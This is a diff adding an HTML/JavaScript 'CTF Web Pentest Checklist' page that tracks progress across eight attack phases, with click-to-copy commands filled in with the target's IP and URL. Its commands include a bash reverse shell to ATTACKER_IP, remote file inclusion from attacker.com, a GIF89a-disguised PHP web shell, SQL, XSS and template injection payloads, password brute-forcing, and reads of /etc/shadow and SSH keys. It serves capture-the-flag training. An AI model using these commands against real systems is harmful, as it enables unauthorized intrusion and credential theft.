@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTF Web Checklist</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:monospace;font-size:14px;background:#1a1a1a;color:#e0e0e0;padding:20px}
+h1{font-size:20px;margin-bottom:4px;color:#fff}
+.sub{color:#888;font-size:12px;margin-bottom:16px}
+.trow{display:flex;align-items:center;gap:8px;background:#2a2a2a;border:1px solid #444;border-radius:6px;padding:8px 12px;margin-bottom:12px}
+.trow label{color:#4ade80;font-size:12px;white-space:nowrap}
+.trow input{flex:1;background:transparent;border:none;color:#e0e0e0;font-family:monospace;font-size:13px;outline:none}
+.pbg{background:#333;border-radius:4px;height:6px;margin-bottom:4px}
+.pfill{background:#4ade80;height:6px;border-radius:4px;transition:width 0.3s}
+.ptxt{color:#888;font-size:11px;margin-bottom:16px}
+.filters{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}
+.fb{background:#2a2a2a;border:1px solid #444;color:#888;padding:4px 10px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:11px}
+.fb:hover{color:#e0e0e0;border-color:#666}
+.fb.active{color:#4ade80;border-color:#4ade80;background:#1a2e1a}
+.rb{background:#2a2a2a;border:1px solid #444;color:#888;padding:4px 10px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:11px;margin-left:auto}
+.rb:hover{color:#f87171;border-color:#f87171}
+.phase{border:1px solid #333;border-radius:6px;margin-bottom:10px;overflow:hidden}
+.ph{display:flex;align-items:center;gap:10px;padding:10px 14px;background:#222;cursor:pointer;user-select:none}
+.ph:hover{background:#2a2a2a}
+.pnum{font-size:10px;color:#666;min-width:24px}
+.pname{flex:1;font-size:13px;font-weight:bold}
+.pprog{font-size:11px;color:#888}
+.parr{font-size:10px;color:#666;transition:transform 0.2s;display:inline-block}
+.parr.open{transform:rotate(90deg)}
+.pb{display:none;border-top:1px solid #333}
+.pb.open{display:block}
+.item{display:flex;align-items:flex-start;gap:10px;padding:8px 14px;border-bottom:1px solid #2a2a2a;cursor:pointer}
+.item:last-child{border-bottom:none}
+.item:hover{background:#222}
+.item.done{opacity:0.4}
+.chk{width:14px;height:14px;border:1px solid #555;border-radius:3px;flex-shrink:0;margin-top:2px;display:flex;align-items:center;justify-content:center;font-size:10px;color:transparent}
+.item.done .chk{background:#4ade80;border-color:#4ade80;color:#000}
+.ib{flex:1;min-width:0}
+.itop{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.itxt{font-size:12px}
+.item.done .itxt{text-decoration:line-through;color:#666}
+.badge{font-size:9px;padding:1px 5px;border-radius:3px;font-weight:bold;flex-shrink:0}
+.bh{background:#3b1a1a;color:#f87171;border:1px solid #5a2a2a}
+.bm{background:#2e2a14;color:#fbbf24;border:1px solid #4a4020}
+.bl{background:#1a1e2e;color:#60a5fa;border:1px solid #2a3050}
+.cb{margin-top:5px}
+.cmd{display:inline-block;font-family:monospace;font-size:10px;color:#aaa;background:#111;border:1px solid #333;border-radius:3px;padding:3px 7px;cursor:pointer;word-break:break-all;max-width:100%}
+.cmd:hover{color:#4ade80;border-color:#4ade80}
+.nw{padding:8px 14px;border-top:1px solid #2a2a2a;background:#111}
+.nl{font-size:9px;color:#555;text-transform:uppercase;letter-spacing:0.08em;margin-bottom:4px}
+.nw textarea{width:100%;background:#1a1a1a;border:1px solid #333;border-radius:4px;color:#ccc;font-family:monospace;font-size:11px;padding:6px 8px;resize:vertical;min-height:40px;outline:none}
+.nw textarea:focus{border-color:#4ade80}
+.toast{position:fixed;bottom:20px;right:20px;background:#1a2e1a;border:1px solid #4ade80;color:#4ade80;font-size:11px;font-family:monospace;padding:7px 14px;border-radius:5px;opacity:0;pointer-events:none;transition:opacity 0.2s;z-index:999}
+.toast.on{opacity:1}
+</style>
+</head>
+<body>
+<h1>CTF Web Pentest Checklist</h1>
+<p class="sub">Check items as you go &mdash; progress saved in browser localStorage</p>
+<div class="trow"><label>IP &rarr;</label><input type="text" id="target-ip" placeholder="10.10.x.x"></div>
+<div class="trow"><label>URL &rarr;</label><input type="text" id="target-url" placeholder="http://target.ctf"></div>
+<div class="pbg"><div class="pfill" id="pf" style="width:0%"></div></div>
+<div class="ptxt" id="pt">0 / 0 completed</div>
+<div class="filters">
+  <button class="fb active" id="f-all">All</button>
+  <button class="fb" id="f-todo">Todo</button>
+  <button class="fb" id="f-done">Done</button>
+  <button class="fb" id="f-high">Critical only</button>
+  <button class="rb" id="btn-reset">Reset</button>
+</div>
+<div id="root"></div>
+<div class="toast" id="toast">Copied!</div>
+<script>
+var D = [
+  {id:"recon",num:"01",name:"Reconnaissance",items:[
+    {t:"DNS enumeration (subdomains, MX, NS, TXT)",p:"high",c:"gobuster dns -d URL_HOST -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"},
+    {t:"Full TCP port scan",p:"high",c:"nmap -sV -sC -p- --min-rate 5000 -oN nmap_full.txt IP"},
+    {t:"UDP top 20 ports",p:"med",c:"nmap -sU --top-ports 20 IP"},
+    {t:"Web stack fingerprinting (headers, whatweb)",p:"high",c:"whatweb -a 3 URL | tee whatweb.txt"},
+    {t:"TLS certificate inspection (SAN, CN, issuer)",p:"med",c:"openssl s_client -connect IP:443 < /dev/null 2>/dev/null | openssl x509 -noout -text"},
+    {t:"crt.sh certificate transparency lookup",p:"low",c:"curl -s https://crt.sh/?q=%.URL_HOST^&output=json | jq .[].name_value | sort -u"},
+    {t:"WHOIS lookup",p:"low",c:"whois IP"}
+  ]},
+  {id:"discovery",num:"02",name:"Discovery and Enumeration",items:[
+    {t:"Directory and file fuzzing (.php .bak .txt .zip)",p:"high",c:"feroxbuster -u URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,bak,txt,zip"},
+    {t:"Virtual host and subdomain fuzzing",p:"high",c:"ffuf -u URL -H Host:FUZZ.URL_HOST -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 1"},
+    {t:"Read robots.txt and sitemap.xml",p:"high",c:"curl URL/robots.txt && curl URL/sitemap.xml"},
+    {t:"HTML source review (comments, tokens, hidden endpoints)",p:"high",c:"curl -s URL | grep -iE comment|TODO|secret|api|token|password|key"},
+    {t:"Exposed config files (.env, .git/HEAD, config.php)",p:"high",c:"curl URL/.env && curl URL/.git/HEAD"},
+    {t:"GET and POST parameter fuzzing",p:"med",c:"ffuf -u URL/page?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"},
+    {t:"API endpoint discovery (Swagger, /api/, /v1/, /graphql)",p:"med",c:"gobuster dir -u URL -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"},
+    {t:"Backup and old file discovery (.bak .old .swp)",p:"med",c:"ffuf -u URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200"},
+    {t:"JavaScript file analysis (endpoints, secrets, API keys)",p:"med",c:"curl -s URL | grep -oP src=.+?\\.js"},
+    {t:"Git repository dump and source extraction",p:"high",c:"git-dumper URL/.git ./git-dump && cd git-dump && git log --oneline"}
+  ]},
+  {id:"auth",num:"03",name:"Authentication",items:[
+    {t:"Test default credentials (admin:admin, admin:password)",p:"high",c:"hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form IP/login:user=^USER^&pass=^PASS^:F=incorrect"},
+    {t:"Auth bypass via SQL injection on login form",p:"high",c:"Try in fields:  ' OR 1=1--   /   admin'--   /   ' OR '1'='1"},
+    {t:"Cookie and session token analysis (base64, JWT)",p:"high",c:"echo TOKEN | base64 -d  &&  jwt_tool TOKEN -T"},
+    {t:"JWT attacks: alg none, weak secret brute-force, kid injection",p:"high",c:"jwt_tool TOKEN -T  &&  hashcat -a 0 -m 16500 TOKEN /usr/share/wordlists/rockyou.txt"},
+    {t:"Username enumeration via response differences or timing",p:"med",c:"ffuf -u URL/login -X POST -d user=FUZZ&pass=x -w usernames.txt -mc 200"},
+    {t:"IDOR on user IDs (change your ID to access other users)",p:"high",c:"Change numeric or UUID IDs in URL, params, or cookies"},
+    {t:"Password reset: predictable token or host header injection",p:"med",c:"Set Host: attacker.com in the password reset request"},
+    {t:"MFA bypass: brute-force 4-digit OTP or response manipulation",p:"med",c:"ffuf -u URL/verify -X POST -d otp=FUZZ -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt"},
+    {t:"Session fixation — session not regenerated after login",p:"low",c:"Record cookie before login, login, check if cookie value changed"}
+  ]},
+  {id:"injection",num:"04",name:"Injection Vulnerabilities",items:[
+    {t:"SQL injection — manual testing and sqlmap",p:"high",c:"sqlmap -u URL/page?id=1 --dbs --batch --level 3 --risk 2"},
+    {t:"XSS — reflected, stored, DOM-based",p:"high",c:"Try: \"><img src=x onerror=prompt(document.domain)>"},
+    {t:"SSTI — template injection (Jinja2, Twig, Freemarker, ERB)",p:"high",c:"Try in all inputs: {{7*7}}  /  ${7*7}  /  <%= 7*7 %>  /  #{7*7}"},
+    {t:"LFI and path traversal",p:"high",c:"ffuf -u URL/page?file=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"},
+    {t:"RFI — remote file inclusion (PHP allow_url_include=On)",p:"med",c:"Try: ?file=http://attacker.com/shell.php"},
+    {t:"OS command injection",p:"high",c:"Append to params: ;id   |id   $(id)   %0aid   &&id"},
+    {t:"XXE — XML external entity injection",p:"med",c:"In XML body inject DOCTYPE with ENTITY pointing to file:///etc/passwd"},
+    {t:"SSRF — access internal services via controlled URL",p:"high",c:"Try: http://127.0.0.1/  /  http://169.254.169.254/latest/meta-data/"},
+    {t:"NoSQL injection (MongoDB)",p:"med",c:"Try: user[$ne]=x&pass[$ne]=x   or JSON body with {\"$gt\":\"\"}"},
+    {t:"GraphQL — introspection, batching, injection",p:"med",c:"Introspection: {__schema{types{name}}}   Tools: graphw00f, graphql-cop"},
+    {t:"LDAP injection",p:"low",c:"Try: *)(uid=*))(&(uid=*   /   admin)(&)"}
+  ]},
+  {id:"upload",num:"05",name:"File Upload",items:[
+    {t:"PHP shell upload with bypassed extension",p:"high",c:"Try: .php .php5 .php7 .phtml .pHp .php.jpg — set Content-Type: image/png"},
+    {t:"Magic bytes bypass — prepend GIF89a to PHP payload",p:"high",c:"printf 'GIF89a\\n<?php system($_GET[cmd]); ?>' > shell.php.gif"},
+    {t:"Path traversal in the uploaded filename",p:"med",c:"Set filename to: ../../shell.php   or   ....//shell.php"},
+    {t:"SVG upload with embedded XSS or XXE payload",p:"med",c:"SVG body: <svg xmlns=http://www.w3.org/2000/svg><script>prompt(1)<\\/script><\\/svg>"},
+    {t:"Zip Slip — archive with path traversal entries",p:"med",c:"Create zip entries pointing to: ../../../var/www/html/shell.php"},
+    {t:"Race condition — upload and access before validation completes",p:"low",c:"Send upload and access requests simultaneously"},
+    {t:"Identify storage path — is it predictable and accessible?",p:"med",c:"Check response for file path hint, fuzz the upload directory"}
+  ]},
+  {id:"logic",num:"06",name:"Business Logic",items:[
+    {t:"Negative price or quantity in POST body",p:"high",c:"Change price=-100 or quantity=-1 in the request body"},
+    {t:"Skip workflow steps — navigate directly to later steps",p:"high",c:"Access /checkout/step3 without going through step1 and step2"},
+    {t:"Coupon or discount code reuse after first use",p:"med",c:"Apply same coupon multiple times or after it should have expired"},
+    {t:"Privilege escalation — IDOR or role parameter tampering",p:"high",c:"Change role=user to role=admin in cookies, JWT payload, or POST params"},
+    {t:"Mass assignment — inject extra fields on create or update",p:"med",c:"Add to register request: role=admin&isAdmin=true&verified=true"},
+    {t:"Missing rate limiting on sensitive actions",p:"med",c:"Rapid-fire login or OTP endpoint — watch for 429 or lockout"},
+    {t:"Integer overflow on numeric input fields",p:"low",c:"Try values: 99999999999  /  -1  /  0  /  2147483648"}
+  ]},
+  {id:"headers",num:"07",name:"Headers and Configuration",items:[
+    {t:"Missing security headers (CSP, HSTS, X-Frame-Options)",p:"med",c:"curl -I URL | grep -iE x-frame|content-security|strict-transport|x-content-type"},
+    {t:"CORS misconfiguration — wildcard or reflected origin",p:"high",c:"curl -H Origin:https://evil.com -I URL/api/ | grep -i access-control"},
+    {t:"CSRF — missing or bypassable token on state-changing requests",p:"med",c:"Verify POST and DELETE requests require a valid CSRF token"},
+    {t:"Open redirect via redirect/next/url/return parameter",p:"med",c:"ffuf -u URL/redirect?url=FUZZ -w /usr/share/seclists/Fuzzing/redirects.txt"},
+    {t:"Clickjacking — missing X-Frame-Options or CSP frame-ancestors",p:"low",c:"Test with an iframe pointing to URL in your own HTML page"},
+    {t:"HTTP request smuggling (CL.TE / TE.CL)",p:"low",c:"Tools: smuggler.py or Burp HTTP Request Smuggler extension"},
+    {t:"Cache poisoning via injected headers (X-Forwarded-Host)",p:"low",c:"Inject header and check if poisoned response gets cached and served"}
+  ]},
+  {id:"postexploit",num:"08",name:"Post-Exploitation",items:[
+    {t:"Read /etc/passwd and /etc/shadow via LFI or RCE",p:"high",c:"curl URL/page?file=../../../../etc/passwd"},
+    {t:"Read environment variables via /proc/self/environ",p:"high",c:"curl URL/page?file=/proc/self/environ"},
+    {t:"Find the flag file on the filesystem",p:"high",c:"find / -name flag* -o -name *.flag -o -name user.txt -o -name root.txt 2>/dev/null"},
+    {t:"Read DB config files (.env, wp-config.php, settings.py)",p:"high",c:"Look for: .env / wp-config.php / config/database.php / application.properties"},
+    {t:"Establish reverse shell once RCE is confirmed",p:"high",c:"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1   (listener: nc -lvnp 4444)"},
+    {t:"Local enumeration (sudo, SUID, crontab, capabilities)",p:"high",c:"sudo -l && find / -perm -4000 2>/dev/null && cat /etc/crontab && getcap -r / 2>/dev/null"},
+    {t:"Read SSH keys, bash history, credential files",p:"med",c:"cat ~/.ssh/id_rsa && cat ~/.bash_history && find / -name *.pem 2>/dev/null"},
+    {t:"Pivot to internal services via port forwarding",p:"med",c:"chisel: server on attacker + client on victim — forward internal ports out"}
+  ]}
+];
+
+var state={done:{},notes:{},filter:"all",collapsed:{}};
+var currentIP="";
+var currentURL="";
+
+function save(){try{localStorage.setItem("ctf",JSON.stringify({done:state.done,notes:state.notes}))}catch(e){}}
+function load(){try{var s=JSON.parse(localStorage.getItem("ctf")||"{}");if(s.done)state.done=s.done;if(s.notes)state.notes=s.notes}catch(e){}}
+function sk(pid,t){return pid+"|||"+t}
+function mk(tag,cls,txt){var e=document.createElement(tag);if(cls)e.className=cls;if(txt!==undefined)e.textContent=txt;return e}
+
+function toast(){var t=document.getElementById("toast");t.classList.add("on");setTimeout(function(){t.classList.remove("on")},1500)}
+
+function copy(txt){
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(toast).catch(function(){fb(txt)})}else{fb(txt)}
+}
+function fb(txt){
+  var ta=document.createElement("textarea");ta.value=txt;ta.style.cssText="position:fixed;opacity:0;top:0;left:0";
+  document.body.appendChild(ta);ta.focus();ta.select();
+  try{document.execCommand("copy");toast()}catch(e){}
+  document.body.removeChild(ta)
+}
+
+function resolveCmd(cmd){
+  var ip=currentIP||"IP";
+  var url=currentURL||"URL";
+  var urlHost=url.replace(/^https?:\/\//,"").replace(/\/.*$/,"");
+  return cmd
+    .replace(/URL_HOST/g,urlHost)
+    .replace(/URL/g,url)
+    .replace(/IP/g,ip);
+}
+
+function updateProg(){
+  var total=0,done=0;
+  D.forEach(function(ph){ph.items.forEach(function(it){total++;if(state.done[sk(ph.id,it.t)])done++})});
+  var pct=total?Math.round(done/total*100):0;
+  document.getElementById("pf").style.width=pct+"%";
+  document.getElementById("pt").textContent=done+" / "+total+" completed ("+pct+"%)";
+}
+
+function render(){
+  var root=document.getElementById("root");
+  root.innerHTML="";
+  D.forEach(function(phase){
+    var isOpen=!state.collapsed[phase.id];
+    var pdone=0;
+    phase.items.forEach(function(it){if(state.done[sk(phase.id,it.t)])pdone++});
+    var vis=phase.items.filter(function(it){
+      var k=sk(phase.id,it.t);
+      if(state.filter==="done")return!!state.done[k];
+      if(state.filter==="todo")return!state.done[k];
+      if(state.filter==="high")return it.p==="high";
+      return true;
+    });
+    if(state.filter!=="all"&&vis.length===0)return;
+
+    var wrap=mk("div","phase");
+    var hdr=mk("div","ph");
+    hdr.appendChild(mk("span","pnum",phase.num));
+    hdr.appendChild(mk("span","pname",phase.name));
+    hdr.appendChild(mk("span","pprog",pdone+"/"+phase.items.length));
+    var arr=mk("span","parr"+(isOpen?" open":""),"\u25B6");
+    hdr.appendChild(arr);
+    hdr.addEventListener("click",(function(pid){return function(){state.collapsed[pid]=!state.collapsed[pid];render()}})(phase.id));
+    wrap.appendChild(hdr);
+
+    var body=mk("div","pb"+(isOpen?" open":""));
+
+    vis.forEach(function(item){
+      var key=sk(phase.id,item.t);
+      var done=!!state.done[key];
+      var row=mk("div","item"+(done?" done":""));
+      row.appendChild(mk("div","chk",done?"\u2713":""));
+      var ib=mk("div","ib");
+      var top=mk("div","itop");
+      top.appendChild(mk("span","itxt",item.t));
+      top.appendChild(mk("span","badge "+(item.p==="high"?"bh":item.p==="med"?"bm":"bl"),item.p==="high"?"critical":item.p==="med"?"medium":"low"));
+      ib.appendChild(top);
+      if(item.c){
+        var cw=mk("div","cb");
+        var resolved=resolveCmd(item.c);
+        var ce=mk("span","cmd",resolved);
+        ce.title="Click to copy";
+        ce.addEventListener("click",(function(txt){return function(e){e.stopPropagation();copy(txt)}})(resolved));
+        cw.appendChild(ce);
+        ib.appendChild(cw);
+      }
+      row.appendChild(ib);
+      row.addEventListener("click",(function(key){return function(){state.done[key]=!state.done[key];save();render()}})(key));
+      body.appendChild(row);
+    });
+
+    var nw=mk("div","nw");
+    nw.appendChild(mk("div","nl","// notes - "+phase.name.toLowerCase()));
+    var ta=document.createElement("textarea");
+    ta.placeholder="Findings, payloads, credentials, URLs...";
+    ta.value=state.notes[phase.id]||"";
+    ta.addEventListener("click",function(e){e.stopPropagation()});
+    ta.addEventListener("input",(function(pid){return function(){state.notes[pid]=this.value;save()}})(phase.id));
+    nw.appendChild(ta);
+    body.appendChild(nw);
+
+    wrap.appendChild(body);
+    root.appendChild(wrap);
+  });
+  updateProg();
+}
+
+function setFilter(f){
+  state.filter=f;
+  document.querySelectorAll(".fb").forEach(function(b){b.classList.remove("active")});
+  document.getElementById("f-"+f).classList.add("active");
+  render();
+}
+
+document.getElementById("f-all").addEventListener("click",function(){setFilter("all")});
+document.getElementById("f-todo").addEventListener("click",function(){setFilter("todo")});
+document.getElementById("f-done").addEventListener("click",function(){setFilter("done")});
+document.getElementById("f-high").addEventListener("click",function(){setFilter("high")});
+document.getElementById("btn-reset").addEventListener("click",function(){
+  if(!confirm("Reset all progress and notes?"))return;
+  state.done={};state.notes={};save();render();
+});
+
+var tiIP=document.getElementById("target-ip");
+var tiURL=document.getElementById("target-url");
+try{tiIP.value=localStorage.getItem("ctf_ip")||""}catch(e){}
+try{tiURL.value=localStorage.getItem("ctf_url")||""}catch(e){}
+currentIP=tiIP.value.trim();
+currentURL=tiURL.value.trim();
+tiIP.addEventListener("input",function(){
+  currentIP=this.value.trim();
+  try{localStorage.setItem("ctf_ip",currentIP)}catch(e){}
+  render();
+});
+tiURL.addEventListener("input",function(){
+  currentURL=this.value.trim();
+  try{localStorage.setItem("ctf_url",currentURL)}catch(e){}
+  render();
+});
+
+load();render();
+</script>
+</body>
+</html>
